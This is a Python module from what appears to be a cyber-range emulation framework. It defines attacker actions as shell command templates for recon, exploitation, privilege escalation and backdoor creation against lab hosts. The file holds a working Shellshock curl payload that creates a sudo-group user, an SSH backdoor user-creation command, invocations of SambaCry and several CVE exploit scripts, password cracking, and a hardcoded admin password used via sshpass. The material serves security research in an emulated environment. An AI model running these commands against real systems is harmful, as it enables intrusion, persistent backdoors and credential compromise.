import csle_common.constants.constants as constants
from csle_common.dao.emulation_action.attacker.emulation_attacker_action import EmulationAttackerAction
from csle_common.dao.emulation_action.attacker.emulation_attacker_action_type import EmulationAttackerActionType
from csle_common.dao.emulation_action.attacker.emulation_attacker_action_id import EmulationAttackerActionId
from csle_common.dao.emulation_action.attacker.emulation_attacker_action_outcome import EmulationAttackerActionOutcome


class EmulationAttackerShellActions:
    """
    Class implementing regular Bash actions for the attacker (e.g. interacting with filesystem or OS) in the emulation
    """

    @staticmethod
    def FIND_FLAG(index: int) -> EmulationAttackerAction:
        """
        Searches through the file systems that have been compromised to find a flag

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.FIND_FLAG
        cmd = ["find / -name 'flag*.txt'  2>&1 | grep -v 'Permission denied'"]
        alt_cmd = ["find / | grep 'flag*'"]
        return EmulationAttackerAction(id=id, name="Find flag", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="Searches the file system for a flag",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.FLAG, alt_cmds=alt_cmd,
                                       backdoor=False)

    @staticmethod
    def INSTALL_TOOLS(index: int) -> EmulationAttackerAction:
        """
        Installs tools on compromised machines

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.INSTALL_TOOLS
        cmd = ["sudo apt-get -y install dnsenum"]
        return EmulationAttackerAction(id=id, name="Install tools", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PIVOTING, alt_cmds=None,
                                       backdoor=False)

    @staticmethod
    def SSH_BACKDOOR(index: int) -> EmulationAttackerAction:
        """
        Installs a SSH backdoor on a compromised machine

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.SSH_BACKDOOR
        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G "
                                         "sudo -p \"$(openssl passwd -1 '{}')\" {}"]
        return EmulationAttackerAction(id=id, name="Install SSH backdoor", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="If taken root on remote machine, installs a ssh backdoor,"
                                             " useful for upgrading telnet"
                                             "or weaker channels",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PIVOTING,
                                       alt_cmds=None,
                                       backdoor=True)

    @staticmethod
    def SAMBACRY_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the sambacry exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.SAMBACRY_EXPLOIT
        cmd = ["sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data "
               "-r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"]
        return EmulationAttackerAction(id=id, name="Sambacry Explolit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the sambacry shell to get remote code execution and "
                                             "then sets up a SSH backdoor to upgrade the channel",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None,
                                       vulnerability=constants.SAMBA.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def SHELLSHOCK_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the shellshock exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.SHELLSHOCK_EXPLOIT
        cmd = ["curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c "
               "'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo "
               "-p $(openssl passwd -1 \'{}\') {}'\" http://{}:80/cgi-bin/vulnerable",
               "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'\" "
               "http://{}:80/cgi-bin/vulnerable"
               ]
        return EmulationAttackerAction(id=id, name="ShellShock Explolit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the Shellshock exploit and curl to do "
                                             "remote code execution and create a backdoor",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None,
                                       vulnerability=constants.SHELLSHOCK.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def DVWA_SQL_INJECTION(index: int) -> EmulationAttackerAction:
        """
        Launches the  DVWA SQL Injection exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.DVWA_SQL_INJECTION
        cmd = ["/sql_injection_exploit.sh"]
        return EmulationAttackerAction(id=id, name="DVWA SQL Injection Exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the DVWA SQL Injection exploit to extract secret passwords",
                                       index=index,
                                       ips=[],
                                       action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
                                       vulnerability=constants.DVWA_SQL_INJECTION.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2015_3306_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2015-3306 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2015_3306_EXPLOIT
        cmd = ["sudo /root/miniconda3/bin/python3 /cve_2015_3306_exploit.py "
               "--port 21 --path '/var/www/html/' --host {}"]
        return EmulationAttackerAction(
            id=id, name="CVE-2015-3306 exploit", cmds=cmd, type=EmulationAttackerActionType.EXPLOIT,
            descr="Uses the CVE-2015-3306 vulnerability to get remote code execution and then sets up a SSH backdoor "
                  "to upgrade the channel", index=index, ips=[],
            action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
            vulnerability=constants.CVE_2015_3306.VULNERABILITY_NAME, backdoor=True)

    @staticmethod
    def CVE_2015_1427_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2015-1427 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2015_1427_EXPLOIT
        cmd = ["/cve_2015_1427_exploit.sh {}:9200"]
        return EmulationAttackerAction(
            id=id, name="CVE-2015-1427 exploit", cmds=cmd, type=EmulationAttackerActionType.EXPLOIT,
            descr="Uses the CVE-2015-1427 vulnerability to get remote code execution and then sets up a SSH backdoor "
                  "to upgrade the channel", index=index, ips=[],
            action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS, alt_cmds=None,
            vulnerability=constants.CVE_2015_1427.VULNERABILITY_NAME, backdoor=True)

    @staticmethod
    def CVE_2016_10033_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2016-10033 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2016_10033_EXPLOIT
        cmd = ["/cve_2016_10033_exploit.sh {}:80"]
        return EmulationAttackerAction(id=id, name="CVE-2016-10033 exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the CVE-2016-10033 vulnerability to get remote "
                                             "code execution and then sets up a SSH backdoor "
                                             "to upgrade the channel",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None,
                                       vulnerability=constants.CVE_2016_10033.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2010_0426_PRIV_ESC(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2010-0426 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2010_0426_PRIV_ESC
        cmd = ["/cve_2010_0426_exploit.sh {}", "/create_backdoor_cve_2010_0426.sh"]
        return EmulationAttackerAction(id=id, name="CVE-2010-0426 exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
                                       descr="Uses the CVE-2010-0426 vulnerability to "
                                             "perform privilege escalation to get root access",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                       alt_cmds=None,
                                       vulnerability=constants.CVE_2010_0426.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2015_5602_PRIV_ESC(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2015-5602 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2015_5602_PRIV_ESC
        cmd = ["/cve_2015_5602_exploit.sh", "su root", constants.CVE_2015_5602.ROOT_PW,
               "/create_backdoor_cve_2015_5602.sh"]
        return EmulationAttackerAction(id=id, name="CVE-2015-5602 exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
                                       descr="Uses the CVE-2015-5602 vulnerability to perform "
                                             "privilege escalation to get root access",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                                       alt_cmds=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                                       backdoor=True)

    @staticmethod
    def CVE_2020_24186_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-2020-24186 Wordpress wpDiscuz plugin

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2020_24186_EXPLOIT
        cmd = ["python3 /wpDiscuz_RemoteCodeExec.py -u http://15.16.3.32/ -p /2025/04/07/hello-world/"]
        return EmulationAttackerAction(id=id, name="CVE-2020-24186 Wordpress wpDiscuz plugin exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the CVE-2020-24186 vulnerability to "
                                             "obtain a remote shell.",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None, vulnerability=constants.CVE_2020_24186.VULNERABILITY_NAME,
                                       backdoor=False)

    @staticmethod
    def CVE_2023_26035_EXPLOIT(index: int) -> EmulationAttackerAction:
        """
        Launches the CVE-26023-26035 ZoneMinder Exploit 

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = EmulationAttackerActionId.CVE_2023_26035_EXPLOIT
        # TODO fix this command
        cmd = ["python3 /zoneminder.py http://15.17.2.21/zm"]
        return EmulationAttackerAction(id=id, name="CVE-26023-26035 ZoneMinder Snapshot Exploit", cmds=cmd,
                                       type=EmulationAttackerActionType.EXPLOIT,
                                       descr="Uses the CVE-26023-26035 vulnerability to "
                                             "obtain a remote shell.",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.SHELL_ACCESS,
                                       alt_cmds=None, vulnerability=constants.CVE_2023_26035.VULNERABILITY_NAME,
                                       backdoor=False)

    @staticmethod
    def WPSCAN(index: int) -> EmulationAttackerAction:
        """
        Perform a WordPress Security Scan

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.WPSCAN
        cmd = ["wpscan --url http://15.16.3.32"]
        return EmulationAttackerAction(id=id, name="WPScan", cmds=cmd,
                                       type=EmulationAttackerActionType.RECON,
                                       descr="Perform a WordPress Security Scan",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
                                       backdoor=False)
        
    @staticmethod
    def DIRB(index: int) -> EmulationAttackerAction:
        """
        Look for existing (and/or hidden) Web Objects

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.DIRB
        cmd = ["dirb http://15.16.3.32 -r"]
        return EmulationAttackerAction(id=id, name="dirb", cmds=cmd,
                                       type=EmulationAttackerActionType.RECON,
                                       descr="Look for existing (and/or hidden) Web Objects",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
                                       backdoor=False)
        
    @staticmethod
    def FFUF(index: int) -> EmulationAttackerAction:
        """
        Look for existing (and/or hidden) Web Objects

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.FFUF
        cmd = ["ffuf -w /SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://15.17.2.21/FUZZ"]
        return EmulationAttackerAction(id=id, name="ffuf", cmds=cmd,
                                       type=EmulationAttackerActionType.RECON,
                                       descr="Look for existing (and/or hidden) Web Objects",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
                                       backdoor=False)

    @staticmethod
    def OPENVPN_LOGIN(index: int) -> EmulationAttackerAction:
        """
        Login into a openVPN session

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.OPENVPN_LOGIN
        cmd = ["sudo openvpn --config  /vpn-files/openvpn-config-sl001-daniel-cox.ovpn &"]
        return EmulationAttackerAction(id=id, name="openvpn_login", cmds=cmd,
                                       type=EmulationAttackerActionType.RECON,
                                       descr="Login into a openVPN session",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.LOGIN, alt_cmds=None,
                                       backdoor=False)

    @staticmethod
    def OPENVPN_EXIT(index: int) -> EmulationAttackerAction:
        """
        Exit a openVPN session

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.OPENVPN_EXIT
        cmd = ["sudo killall openvpn"]
        return EmulationAttackerAction(id=id, name="openvpn_exit", cmds=cmd,
                                       type=EmulationAttackerActionType.RECON,
                                       descr="Exit a openVPN session",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.LOGIN, alt_cmds=None,
                                       backdoor=False)

    @staticmethod
    def ROOT_COMMANDS(index: int) -> EmulationAttackerAction:
        """
        Escalate Priv and commands

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.ROOT_COMMANDS
        cmd = ["echo \"/script.sh\" | sshpass -p \"csle@admin-pw_191\" ssh csle_admin@15.16.3.32 -o StrictHostKeyChecking=no"]
        return EmulationAttackerAction(id=id, name="root commands", cmds=cmd,
                                       type=EmulationAttackerActionType.PRIVILEGE_ESCALATION,
                                       descr="Escalate Priv and commands",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT, alt_cmds=None,
                                       backdoor=False)

    def PASSWORD_CRACK(index: int) -> EmulationAttackerAction:
        """
        Hash cracking with john the ripper

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.PASSWORD_CRACK
        # !! CHANGE THIS 
        cmd = ["john --wordlist=rockyou.txt passwords.txt"]
        return EmulationAttackerAction(id=id, name="hash cracking", cmds=cmd,
                                       type=EmulationAttackerActionType.POST_EXPLOIT,
                                       descr="Hash cracking with john the ripper",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
                                       backdoor=False)
        
    def DNSENUM(index: int) -> EmulationAttackerAction:
        """
        Perform a DNS Enumeration

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = EmulationAttackerActionId.DNSENUM
        cmd = ["dnsenum -f /SecLists/Discovery/DNS/subdomains-top1million-5000.txt --dnsserver 15.17.1.13 aecid-testbed.com"]
        return EmulationAttackerAction(id=id, name="dnsenum", cmds=cmd,
                                       type=EmulationAttackerActionType.RECON,
                                       descr="Perform a DNS Enumeration",
                                       index=index,
                                       ips=[], action_outcome=EmulationAttackerActionOutcome.INFORMATION_GATHERING, alt_cmds=None,
                                       backdoor=False)
